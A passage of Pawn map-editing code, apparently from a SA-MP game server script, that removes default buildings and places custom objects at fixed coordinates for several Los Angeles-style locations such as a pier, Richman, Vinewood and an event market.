		RemoveBuildingForPlayer(playerid, 1408, 2099.8594, -1799.4219, 13.1016, 0.25);
		RemoveBuildingForPlayer(playerid, 1432, 2104.0156, -1812.4219, 12.6719, 0.25);
		RemoveBuildingForPlayer(playerid, 1432, 2101.9922, -1814.7109, 12.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 1432, 2103.4063, -1817.3047, 12.6719, 0.25);
		RemoveBuildingForPlayer(playerid, 1432, 2102.1250, -1819.9531, 12.6719, 0.25);
		RemoveBuildingForPlayer(playerid, 1432, 2101.6328, -1798.1719, 12.6719, 0.25);
		RemoveBuildingForPlayer(playerid, 1432, 2103.9609, -1800.5625, 12.6719, 0.25);
		RemoveBuildingForPlayer(playerid, 1408, 2099.8516, -1793.9766, 13.1016, 0.25);
		RemoveBuildingForPlayer(playerid, 1283, 2094.6797, -1762.9531, 15.7266, 0.25);
		RemoveBuildingForPlayer(playerid, 712, 2100.8125, -1764.3750, 21.3906, 0.25);
		RemoveBuildingForPlayer(playerid, 1408, 2102.6641, -1791.3281, 13.1016, 0.25);
		RemoveBuildingForPlayer(playerid, 1432, 2103.6875, -1795.9063, 12.6719, 0.25);
		RemoveBuildingForPlayer(playerid, 1432, 2102.0625, -1793.1406, 12.6719, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 2105.0859, -1765.6094, 10.8047, 0.25);
		RemoveBuildingForPlayer(playerid, 1259, 2128.2344, -1780.7109, 23.8750, 0.25);
		RemoveBuildingForPlayer(playerid, 5528, 2101.2969, -1688.7734, 18.0859, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 2116.8047, -1676.6094, 16.2422, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 2108.6953, -1661.7656, 17.5781, 0.25);
		CreatePlayerObject(playerid,1259, 2073.53955, -1781.81079, 12.06198,   1.80000, 272.15970, 182.90045);
		CreatePlayerObject(playerid,6236, 2108.00000, -1680.00000, 9.40000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,6236, 2100.39990, -1751.40002, 9.30000,   0.00000, 0.00000, 176.00000);
		CreatePlayerObject(playerid,10984, 2102.60010, -1642.09998, 8.50000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 2113.10010, -1642.40002, 8.50000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 2111.80005, -1650.50000, 8.50000,   0.00000, 0.00000, 294.00000);
		CreatePlayerObject(playerid,10984, 2116.00000, -1649.59998, 11.70000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 2106.80005, -1647.19995, 11.70000,   0.00000, 0.00000, 314.00000);
		CreatePlayerObject(playerid,10984, 2125.30005, -1654.40002, 11.70000,   0.00000, 0.00000, 251.99500);
		CreatePlayerObject(playerid,10984, 2129.89990, -1657.09998, 13.20000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,14469, 2105.30005, -1648.69995, 9.30000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,744, 2106.19995, -1657.80005, 5.60000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,744, 2105.60010, -1662.90002, 5.60000,   0.00000, 0.00000, 326.00000);
		CreatePlayerObject(playerid,746, 2123.89990, -1652.19995, 12.20000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,901, 2112.69995, -1656.69995, 9.90000,   0.00000, 0.00000, 14.00000);
		CreatePlayerObject(playerid,901, 2104.30005, -1653.50000, 9.90000,   0.00000, 0.00000, 123.99700);
		CreatePlayerObject(playerid,744, 2110.30005, -1662.80005, 5.60000,   0.00000, 0.00000, 5.99700);
		CreatePlayerObject(playerid,901, 2113.60010, -1713.50000, 9.90000,   0.00000, 0.00000, 65.99700);
		CreatePlayerObject(playerid,901, 2107.60010, -1732.19995, 9.90000,   0.00000, 0.00000, 227.99500);
		CreatePlayerObject(playerid,744, 2096.10010, -1718.59998, 5.60000,   0.00000, 0.00000, 29.99300);
		CreatePlayerObject(playerid,744, 2100.10010, -1717.50000, 5.60000,   0.00000, 0.00000, 79.99300);
		CreatePlayerObject(playerid,13707, 2089.30005, -1753.59998, 11.40000,   0.00000, 0.00000, 4.00000);
		CreatePlayerObject(playerid,901, 2109.12549, -1737.71252, 9.90000,   0.00000, 0.00000, 203.99400);
		CreatePlayerObject(playerid,10984, 2050.81567, -1825.80469, 13.00000,   0.00000, 0.00000, 92.63303);
		CreatePlayerObject(playerid,901, 2099.39990, -1745.50000, 9.90000,   0.00000, 0.00000, 333.99500);
		CreatePlayerObject(playerid,10984, 2080.92358, -1739.82507, 13.00000,   0.00000, 0.00000, 170.00000);
		CreatePlayerObject(playerid,10984, 2084.27075, -1724.50488, 13.00000,   0.00000, 0.00000, 355.99701);
		CreatePlayerObject(playerid,5472, 2108.30005, -1680.69995, -3.60000,   0.00000, 336.00000, 89.97800);
		CreatePlayerObject(playerid,10984, 2112.00000, -1610.90002, 24.40000,   0.00000, 0.00000, 267.99500);
		CreatePlayerObject(playerid,10984, 2112.89990, -1595.50000, 24.40000,   0.00000, 0.00000, 207.99500);
		CreatePlayerObject(playerid,746, 2117.50000, -1611.90002, 25.30000,   0.00000, 0.00000, 354.00000);
		CreatePlayerObject(playerid,746, 2111.30005, -1612.09998, 25.30000,   0.00000, 0.00000, 269.99600);
		CreatePlayerObject(playerid,746, 2104.10010, -1612.00000, 25.00000,   0.00000, 0.00000, 225.99500);
		CreatePlayerObject(playerid,5391, 2148.80469, -1627.12500, 13.42969,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,845, 2115.30005, -1610.90002, 26.50000,   0.00000, 0.00000, 332.00000);
		CreatePlayerObject(playerid,843, 2106.80005, -1610.90002, 26.40000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,746, 2106.60010, -1612.50000, 25.00000,   0.00000, 0.00000, 225.99400);
		CreatePlayerObject(playerid,647, 2112.16992, -1606.82227, 26.55636,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,647, 2105.50000, -1610.09998, 25.10000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,647, 2108.50000, -1610.00000, 25.10000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,647, 2114.69995, -1608.80005, 26.70000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,647, 2117.80005, -1609.90002, 26.20000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,647, 2120.89990, -1609.69995, 25.40000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,647, 2103.19995, -1613.50000, 24.10000,   0.00000, 0.00000, 298.00000);
		CreatePlayerObject(playerid,647, 2104.80005, -1615.19995, 24.10000,   0.00000, 0.00000, 297.99899);
		CreatePlayerObject(playerid,647, 2104.19995, -1618.19995, 24.10000,   0.00000, 0.00000, 297.99899);
		CreatePlayerObject(playerid,647, 2121.89990, -1611.30005, 24.10000,   0.00000, 0.00000, 297.99899);
		CreatePlayerObject(playerid,647, 2121.69995, -1612.90002, 24.10000,   0.00000, 0.00000, 355.99899);
		CreatePlayerObject(playerid,647, 2120.69995, -1614.09998, 24.10000,   0.00000, 358.00000, 63.99500);
		CreatePlayerObject(playerid,647, 2096.50000, -1707.40002, 12.00000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,647, 2097.10010, -1704.19995, 11.90000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,647, 2097.89990, -1701.50000, 11.70000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,901, 2098.30005, -1694.00000, 9.90000,   0.00000, 0.00000, 65.99500);
		CreatePlayerObject(playerid,901, 2099.39990, -1680.80005, 9.90000,   0.00000, 0.00000, 81.99500);
		CreatePlayerObject(playerid,901, 2103.19995, -1664.40002, 9.90000,   0.00000, 0.00000, 65.99100);
		CreatePlayerObject(playerid,647, 2104.69995, -1658.50000, 14.30000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,647, 2102.19995, -1657.40002, 14.60000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,819, 2095.60010, -1711.30005, 12.20000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,744, 2093.89990, -1713.90002, 10.00000,   0.00000, 0.00000, 79.99100);
		CreatePlayerObject(playerid,10984, 2099.39990, -1719.90002, 9.60000,   0.00000, 26.00000, 353.99500);
		CreatePlayerObject(playerid,10984, 2102.50000, -1704.09998, 9.60000,   0.00000, 25.99900, 327.98999);
		CreatePlayerObject(playerid,901, 2103.19995, -1692.69995, 9.90000,   0.00000, 356.00000, 283.99500);
		CreatePlayerObject(playerid,4206, 2106.00000, -1714.09998, 8.50000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,4206, 2095.10010, -1731.19995, 8.50000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,4206, 2114.80005, -1698.69995, 8.60000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,4206, 2115.10010, -1677.69995, 8.80000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,4206, 2108.00000, -1664.69995, 8.60000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,803, 2093.50000, -1719.59998, 13.40000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,803, 2093.69995, -1724.00000, 13.60000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,803, 2092.07104, -1728.89709, 13.00000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,901, 2121.89990, -1643.90002, 16.30000,   0.00000, 318.00000, 77.99700);
		CreatePlayerObject(playerid,901, 2103.39990, -1641.90002, 16.30000,   0.00000, 317.99899, 49.99200);
		CreatePlayerObject(playerid,803, 2102.60010, -1651.40002, 14.50000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3865, 2090.07837, -1737.20618, 10.64651,   0.00000, 0.00000, 86.53737);
		CreatePlayerObject(playerid,3865, 2090.64917, -1732.46838, 10.64651,   0.00000, 0.00000, 86.53737);
		CreatePlayerObject(playerid,9831, 2093.86279, -1738.28040, 9.07401,   7.08000, -1.44000, 270.36465);
		CreatePlayerObject(playerid,9831, 2094.73584, -1733.48730, 9.07401,   7.08000, -1.44000, 270.36465);
		CreatePlayerObject(playerid,1408, 2100.81030, -1793.93201, 12.65273,   -93.05998, 3.24000, 66.24356);
		CreatePlayerObject(playerid,10984, 2098.50000, -1761.80005, 13.00000,   0.00000, 0.00000, 138.00000);
		CreatePlayerObject(playerid,5532, 2055.64307, -1831.70898, 18.35815,   5.70000, -1.02000, 0.00000);
		CreatePlayerObject(playerid,10984, 2106.67334, -1800.68445, 13.00000,   0.00000, 0.00000, 138.00000);
		CreatePlayerObject(playerid,10984, 2071.28369, -1768.86694, 13.00000,   0.00000, 0.00000, 3.21296);
		CreatePlayerObject(playerid,1267, 2061.59302, -1827.29016, 19.73772,   1.68000, 4.26000, 272.33047);
		CreatePlayerObject(playerid,3887, 2046.90491, -1773.04224, 20.03115,   0.00000, 0.00000, 89.01779);
		CreatePlayerObject(playerid,3866, 2060.92310, -1789.11499, 20.15360,   0.00000, 0.00000, 89.49438);
		CreatePlayerObject(playerid,10984, 2066.36108, -1824.50208, 13.00000,   0.00000, 0.00000, 92.63303);
		CreatePlayerObject(playerid,10984, 2049.34741, -1783.32629, 13.00000,   0.00000, 0.00000, 92.63303);
		CreatePlayerObject(playerid,10984, 2031.48816, -1779.33594, 13.00000,   0.00000, 0.00000, 342.89899);
		CreatePlayerObject(playerid,10984, 2065.98169, -1781.58130, 13.00000,   0.00000, 0.00000, 92.63303);
		CreatePlayerObject(playerid,10984, 2056.67212, -1771.63342, 13.00000,   0.00000, 0.00000, 92.63303);
		CreatePlayerObject(playerid,10984, 2043.08557, -1774.09497, 13.00000,   0.00000, 0.00000, 92.63303);
		CreatePlayerObject(playerid,10984, 2065.18848, -1794.86084, 13.00000,   0.00000, 0.00000, 81.52964);
		CreatePlayerObject(playerid,10984, 2046.50427, -1793.14343, 15.99973,   16.26000, -2.28000, 92.63303);
		CreatePlayerObject(playerid,10984, 2056.74634, -1794.86609, 13.00000,   0.00000, 0.00000, 92.63303);
		CreatePlayerObject(playerid,10984, 2041.41101, -1794.53125, 13.00000,   0.00000, 0.00000, 92.63303);
		CreatePlayerObject(playerid,10984, 2040.14661, -1788.42676, 13.00000,   0.00000, 0.00000, 92.63303);
		CreatePlayerObject(playerid,10984, 2024.33521, -1769.93005, 13.00000,   0.00000, 0.00000, 342.89899);
		CreatePlayerObject(playerid,10984, 2071.28369, -1768.86694, 13.00000,   0.00000, 0.00000, 3.21296);
		CreatePlayerObject(playerid,10984, 2086.19995, -1755.00000, 13.00000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1283, 2082.82104, -1766.68469, 12.67914,   92.22002, -0.96000, 166.13197);
		CreatePlayerObject(playerid,1259, 2113.07593, -1784.27283, 12.06198,   -0.12000, 271.55997, 316.82281);
		//--------------------------------------------

		//------------------ SANTA MARÝA ÝSKELESÝ ---------------------
		RemoveBuildingForPlayer(playerid, 6189, 836.4453, -2003.5234, -2.6406, 0.25);
		RemoveBuildingForPlayer(playerid, 6191, 836.4453, -2003.5234, -2.6406, 0.25);
		RemoveBuildingForPlayer(playerid, 1461, 820.1484, -2061.0625, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 1461, 820.1484, -2055.2422, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 820.2813, -2019.0000, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 820.2813, -2015.0625, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 820.2813, -2002.9688, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 820.2813, -1999.0313, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 820.2813, -1968.7891, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 820.2813, -1977.1797, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 638, 820.3438, -2058.1641, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 792, 820.9297, -2066.1797, 12.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 792, 820.9297, -2036.6953, 12.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 792, 820.9297, -2008.9141, 12.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 1461, 820.7891, -2011.7969, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 792, 820.9297, -1991.4922, 12.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 1461, 820.7891, -2005.9844, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 821.0078, -1986.0938, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 792, 820.9297, -1973.4922, 12.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 1461, 820.7891, -1980.5625, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 1461, 820.7891, -1965.9766, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 792, 820.9297, -1950.1719, 12.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 821.5469, -2048.8984, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 1281, 821.8125, -2042.2969, 12.6172, 0.25);
		RemoveBuildingForPlayer(playerid, 1281, 824.7969, -2036.6797, 12.6172, 0.25);
		RemoveBuildingForPlayer(playerid, 1281, 821.8125, -2031.3516, 12.6172, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 821.1094, -2023.7422, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 821.0703, -1996.2500, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 821.1016, -1961.1250, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 1281, 821.8125, -1956.0469, 12.6172, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 821.1016, -1940.6797, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 1281, 821.8125, -1945.1016, 12.6172, 0.25);
		RemoveBuildingForPlayer(playerid, 1281, 824.1563, -1950.4297, 12.6172, 0.25);
		RemoveBuildingForPlayer(playerid, 792, 851.7969, -2049.0000, 12.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 792, 851.7969, -2066.3594, 12.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 852.4531, -2060.3359, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 1461, 852.7344, -2055.2422, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 638, 852.5313, -2058.1641, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 852.6094, -2042.5547, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 852.4531, -2039.6875, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 638, 852.5313, -2036.3906, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 1461, 852.7344, -2033.4688, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 852.6094, -2030.4531, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 851.7578, -2023.7422, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 852.6094, -2026.5234, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 792, 851.7969, -2018.0313, 12.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 1281, 851.0078, -1992.5781, 12.6172, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 851.7578, -2012.7031, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 851.7578, -1994.9375, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 852.6094, -2008.8906, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 852.6094, -2004.9609, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 1461, 852.7344, -1997.3672, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 638, 852.5313, -2000.6406, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 1281, 848.5625, -1986.6719, 12.6172, 0.25);
		RemoveBuildingForPlayer(playerid, 792, 851.9766, -1986.8828, 12.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 1281, 851.0078, -1981.6328, 12.6172, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 851.7578, -1978.5313, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 852.6094, -1974.2734, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 852.6094, -1970.3359, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 792, 851.7969, -1955.9297, 12.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 852.2109, -1961.1250, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 1231, 852.2109, -1950.5938, 14.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 638, 852.5313, -1965.3203, 12.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 852.6094, -1942.2891, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, 852.6094, -1946.2188, 12.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 792, 851.7969, -1937.1875, 12.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 4241, 496.4141, -2210.7031, -29.2578, 0.25);
		RemoveBuildingForPlayer(playerid, 4376, 496.4141, -2210.7031, -29.2578, 0.25);
		CreatePlayerObject(playerid,6189, 831.32623, -2018.49902, -6.49338,   3.06000, -20.58000, 356.66449);

		//--------------------------------------

		//---------------- RÝCHMAN BÖLGESÝ ------------------

		RemoveBuildingForPlayer(playerid, 3729, 946.8281, -856.8438, 88.3359, 0.25);
		RemoveBuildingForPlayer(playerid, 3614, 946.8281, -856.8438, 88.3359, 0.25);
		CreatePlayerObject(playerid,3866, 936.09174, -846.94458, 100.11755,   0.00000, 0.00000, 207.30750);
		CreatePlayerObject(playerid,10984, 933.85034, -846.96704, 92.47697,   0.00000, 0.00000, 220.79765);
		CreatePlayerObject(playerid,10984, 946.40088, -845.71924, 92.47697,   0.00000, 0.00000, 313.21313);
		CreatePlayerObject(playerid,10984, 940.69287, -847.86243, 92.47697,   0.00000, 0.00000, 325.68585);

		//-- Starfish iskelesi, yýkýk dönme dolap | Certain

		CreatePlayerObject(playerid,6298,374.7000100,-2031.1000000,10.0000000,90.0000000,354.7180000,281.2820000); //object(ferris01_law2) (2)

		RemoveBuildingForPlayer(playerid, 6463, 389.7734, -2028.4688, 19.8047, 0.25);
		RemoveBuildingForPlayer(playerid, 6465, 368.0547, -2028.2422, 8.7344, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2028.5000, 32.2266, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2021.6406, 29.9297, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2017.4531, 24.0313, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2017.4297, 16.8516, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2021.6328, 10.9844, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2028.5156, 8.7813, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2035.3984, 10.9453, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2039.6406, 16.8438, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2039.6563, 24.1094, 0.25);
		RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2035.3828, 29.9531, 0.25);
		RemoveBuildingForPlayer(playerid, 1232, 364.6094, -2036.1797, 9.5000, 0.25);
		RemoveBuildingForPlayer(playerid, 6462, 368.0547, -2028.2422, 8.7344, 0.25);
		RemoveBuildingForPlayer(playerid, 1232, 374.7969, -2046.9375, 9.5000, 0.25);
		RemoveBuildingForPlayer(playerid, 1232, 374.7969, -2006.1563, 9.5000, 0.25);
		RemoveBuildingForPlayer(playerid, 1215, 379.5938, -2042.4922, 7.3750, 0.25);
		RemoveBuildingForPlayer(playerid, 1215, 379.5938, -2030.3359, 7.3750, 0.25);
		RemoveBuildingForPlayer(playerid, 1215, 379.5938, -2016.7500, 7.3750, 0.25);
		RemoveBuildingForPlayer(playerid, 1215, 386.5703, -2049.3516, 7.3750, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2039.6406, 16.8438, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2039.6563, 24.1094, 0.25);
		RemoveBuildingForPlayer(playerid, 6298, 389.7734, -2028.4688, 19.8047, 0.25);
		RemoveBuildingForPlayer(playerid, 6461, 389.7734, -2028.5000, 20.1094, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2028.5000, 32.2266, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2021.6406, 29.9297, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2017.4531, 24.0313, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2017.4297, 16.8516, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2021.6328, 10.9844, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2028.5156, 8.7813, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2035.3984, 10.9453, 0.25);
		RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2035.3828, 29.9531, 0.25);
		RemoveBuildingForPlayer(playerid, 4245, 272.4844, -2012.1953, -15.4766, 0.25);
		RemoveBuildingForPlayer(playerid, 4380, 272.4844, -2012.1953, -15.4766, 0.25);
	    //gemimap
		CreatePlayerObject(playerid,5167, 466.84818, -2077.65186, 1.34991,   16.68001, -1.50000, 268.50845);
		CreatePlayerObject(playerid,5160, 456.04419, -2184.73633, -0.02430,   16.70000, -1.50000, 268.50851);
		CreatePlayerObject(playerid,5166, 455.99667, -2184.08838, -0.03400,   16.68000, -1.50000, 268.50851);
		CreatePlayerObject(playerid,5156, 464.43637, -2129.06689, 6.04308,   16.68000, -1.50000, 268.50851);
		CreatePlayerObject(playerid,5155, 463.60904, -2053.94092, 14.01090,   17.34000, -0.18000, 268.50851);
		CreatePlayerObject(playerid,3724, 459.81754, -2111.97412, 23.43727,   16.68000, -1.50000, 268.50851);
		CreatePlayerObject(playerid,3724, 457.66074, -2186.44702, 25.53109,   16.68000, -1.50000, 268.50851);
		CreatePlayerObject(playerid,5157, 457.28635, -2236.02173, 15.45450,   16.68000, -1.50000, 268.50851);
		CreatePlayerObject(playerid,7622, 441.39108, -2148.72461, 1.82449,   -18.12000, -30.90001, 0.00000);
		CreatePlayerObject(playerid,7025, 435.07285, -2123.98975, 0.01391,   1.38000, -27.48000, 322.32535);
		CreatePlayerObject(playerid,8075, 443.22192, -2107.29517, -0.03839,   -25.08001, -0.12000, 108.31615);
	    //vinewoodevent
		RemoveBuildingForPlayer(playerid, 13759, 1413.4141, -804.7422, 83.4375, 0.25);
		RemoveBuildingForPlayer(playerid, 13874, 1535.3125, -784.6016, 77.8125, 0.25);
		RemoveBuildingForPlayer(playerid, 13831, 1413.4141, -804.7422, 83.4375, 0.25);
		RemoveBuildingForPlayer(playerid, 3763, 1459.1797, -783.2656, 124.3906, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 1483.3750, -855.3281, 58.4219, 0.25);
		RemoveBuildingForPlayer(playerid, 13721, 1535.3125, -784.6016, 77.8125, 0.25);
		CreatePlayerObject(playerid,13831, 1431.98108, -824.67737, 62.36722,   324.00000, 18.00000, -11.00000);
		CreatePlayerObject(playerid,3763, 1495.07788, -790.46564, 82.01999,   309.00000, 121.00000, 4.00000);
		CreatePlayerObject(playerid,3866, 1548.35913, -803.72614, 66.42812,   11.00000, 11.00000, 0.00000);
		CreatePlayerObject(playerid,3866, 1540.53503, -806.78302, 64.21860,   11.00000, 11.00000, 180.00000);
		CreatePlayerObject(playerid,10984, 1541.67957, -809.52911, 71.81571,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1542.73694, -796.82880, 72.43089,   0.00000, 0.00000, 127.00000);
		CreatePlayerObject(playerid,10984, 1551.18701, -802.93311, 71.29932,   0.00000, 0.00000, -4.00000);
		CreatePlayerObject(playerid,3866, 1531.26428, -758.99548, 71.76790,   11.00000, 11.00000, 40.00000);
		CreatePlayerObject(playerid,3866, 1526.36096, -768.77911, 71.76790,   11.00000, 11.00000, 222.00000);
		CreatePlayerObject(playerid,10984, 1520.35010, -761.99774, 79.64629,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1528.23120, -766.71509, 79.21528,   0.00000, 0.00000, -127.00000);
		CreatePlayerObject(playerid,620, 1483.38525, -855.20038, 58.42190,   357.00000, 76.00000, 91.00000);
		//eventmarket
		RemoveBuildingForPlayer(playerid, 4115, 1350.4141, -1512.0078, 23.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 4116, 1345.6250, -1552.9609, 48.5156, 0.25);
		RemoveBuildingForPlayer(playerid, 4119, 1375.2734, -1452.3984, 23.0391, 0.25);
		RemoveBuildingForPlayer(playerid, 4221, 1406.7109, -1499.5625, 69.1563, 0.25);
		RemoveBuildingForPlayer(playerid, 1261, 1408.6563, -1407.1719, 28.6250, 0.25);
		RemoveBuildingForPlayer(playerid, 4113, 1345.6250, -1552.9609, 48.5156, 0.25);
		RemoveBuildingForPlayer(playerid, 4114, 1350.4141, -1512.0078, 23.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 4120, 1364.1953, -1491.6016, 25.6016, 0.25);
		RemoveBuildingForPlayer(playerid, 4117, 1375.2734, -1452.3984, 23.0391, 0.25);
		RemoveBuildingForPlayer(playerid, 4239, 1407.9063, -1407.3984, 33.9844, 0.25);
		RemoveBuildingForPlayer(playerid, 1267, 1408.6563, -1407.1719, 28.6250, 0.25);
		RemoveBuildingForPlayer(playerid, 6091, 836.5391, -1427.9688, 16.2578, 0.25);
		RemoveBuildingForPlayer(playerid, 6092, 885.9375, -1426.8750, 16.7188, 0.25);
		RemoveBuildingForPlayer(playerid, 6109, 1219.8984, -1449.4375, 29.3125, 0.25);
		RemoveBuildingForPlayer(playerid, 6153, 1007.3125, -1435.1641, 19.1172, 0.25);
		RemoveBuildingForPlayer(playerid, 6192, 988.9063, -1487.9063, 24.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 6195, 1236.5234, -1488.1641, 40.6875, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 1305.6719, -1583.7031, 12.5859, 0.25);
		RemoveBuildingForPlayer(playerid, 1290, 1341.3516, -1476.6016, 18.2266, 0.25);
		RemoveBuildingForPlayer(playerid, 6151, 1007.3125, -1435.1641, 19.1172, 0.25);
		RemoveBuildingForPlayer(playerid, 615, 1110.5469, -1416.7266, 13.9531, 0.25);
		RemoveBuildingForPlayer(playerid, 615, 1147.6016, -1416.8750, 13.9531, 0.25);
		RemoveBuildingForPlayer(playerid, 1307, 1040.8906, -1415.3438, 12.3672, 0.25);
		RemoveBuildingForPlayer(playerid, 6099, 1219.8984, -1449.4375, 29.3125, 0.25);
		RemoveBuildingForPlayer(playerid, 1290, 1348.0078, -1447.9219, 18.2266, 0.25);
		RemoveBuildingForPlayer(playerid, 1312, 1343.8594, -1426.0156, 16.5469, 0.25);
		RemoveBuildingForPlayer(playerid, 621, 811.8750, -1417.9297, 11.6953, 0.25);
		RemoveBuildingForPlayer(playerid, 6214, 849.3359, -1490.0625, 15.2031, 0.25);
